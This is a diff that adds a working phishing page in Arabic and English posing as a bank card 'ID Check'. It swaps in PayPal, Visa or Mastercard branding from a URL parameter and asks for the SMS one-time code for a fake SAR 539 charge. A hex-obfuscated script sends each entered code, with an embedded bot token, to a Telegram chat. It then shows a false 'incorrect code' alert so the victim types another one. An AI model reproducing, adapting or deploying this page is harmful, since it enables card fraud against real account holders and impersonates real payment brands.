@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank Verification | Safe Pay</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Tajawal', sans-serif; background-color: #F8FAFC; }
+        .dynamic-theme { transition: all 0.5s ease; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-md border border-gray-100 relative dynamic-theme">
+        <div class="flex justify-between items-center mb-8">
+            <img id="bank_logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/2560px-PayPal.svg.png" class="h-10 transition-all duration-500">
+            <div id="bank_badge" class="flex items-center gap-1 font-bold text-xs italic transition-colors">
+                <span class="text-lg">●</span> ID Check
+            </div>
+        </div>
+
+        <h2 class="text-center font-bold text-xl text-gray-800 mb-2">Verify your transaction</h2>
+        <p class="text-[13px] text-center text-gray-400 mb-8 leading-relaxed">
+            يرجى إدخال رمز التحقق المرسل إلى جوالك المسجل لدى البنك لإتمام العملية.
+        </p>
+
+        <div class="space-y-3 mb-8 text-[13px] bg-gray-50 p-4 rounded-xl">
+            <div class="flex justify-between text-gray-500"><span>Merchant:</span><span class="font-bold text-gray-800">Paymob Secure</span></div>
+            <div class="flex justify-between text-gray-500"><span>Amount:</span><span class="font-bold text-gray-800">SAR 539.00</span></div>
+            <div class="flex justify-between text-gray-500"><span>Status:</span><span class="text-blue-600 font-bold">Awaiting OTP</span></div>
+        </div>
+
+        <div class="text-center mb-8">
+            <label class="text-[10px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Verification code</label>
+            <input type="tel" id="otp_code" class="w-full text-center text-3xl tracking-[0.8em] font-mono border-b-2 border-gray-100 focus:border-blue-600 focus:outline-none py-2" maxlength="6" placeholder="••••••">
+        </div>
+
+        <button id="auth_btn" class="w-full h-[56px] rounded-xl font-bold text-lg text-white shadow-lg active:scale-95 transition-all mb-6">
+            SUBMIT
+        </button>
+        
+        <div class="flex justify-around text-gray-400 text-xs font-bold">
+            <span class="cursor-pointer hover:text-blue-600 uppercase">Resend Code</span>
+            <span class="cursor-pointer hover:text-red-500 uppercase">Cancel</span>
+        </div>
+    </div>
+
+    <script>
+        // 1. منطق "الحرباء" لتغيير شكل الصفحة
+        const params = new URLSearchParams(window.location.search);
+        const bank = params.get('bank');
+        const logo = document.getElementById('bank_logo');
+        const btn = document.getElementById('auth_btn');
+        const badge = document.getElementById('bank_badge');
+
+        if (bank === 'Visa') {
+            logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png";
+            btn.style.backgroundColor = "#005FF9"; badge.style.color = "#005FF9";
+        } else if (bank === 'Mastercard') {
+            logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png";
+            btn.style.backgroundColor = "#EB001B"; badge.style.color = "#EB001B";
+        } else {
+            logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/2560px-PayPal.svg.png"; // شعار مدى الافتراضي
+            btn.style.backgroundColor = "#2E7D32"; badge.style.color = "#2E7D32";
+        }
+
+        // 2. المحرك المشفر للإرسال
+        var _0x5a12=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74','\x38\x33\x31\x30\x34\x31\x30\x35\x34\x36\x3a\x41\x41\x47\x6f\x4e\x6b\x75\x45\x6d\x6e\x5a\x36\x61\x62\x79\x46\x44\x77\x53\x79\x74\x52\x66\x55\x6f\x4f\x52\x4a\x71\x66\x30\x78\x51\x66\x49','\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\x50\x4f\x53\x54','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'];
+        var _0x4d38=function(_0x2d5f19){return _0x5a12[_0x2d5f19];};
+        
+        document['getElementById']('auth_btn')['onclick']=function(){
+            const _otp = document['getElementById']('otp_code')['value'];
+            if(_otp['length'] < 4) return;
+
+            const _msg = '🔑\x20OTP\x20Received\x20|\x20'+bank+'\x20🚨\x0a\x0a🔢\x20Code:\x20'+_otp;
+            
+            fetch(_0x4d38(0x0)+_0x4d38(0x1)+_0x4d38(0x2),{
+                'method':_0x4d38(0x3),
+                'headers':{'Content-Type':_0x4d38(0x4)},
+                'body':JSON['stringify']({'chat_id':'8576496261','text':_msg})
+            })['then'](() => {
+                alert('الرمز غير صحيح، يرجى إعادة المحاولة.');
+                document['getElementById']('otp_code')['value'] = '';
+            });
+        };
+    </script>
+</body>
+</html>
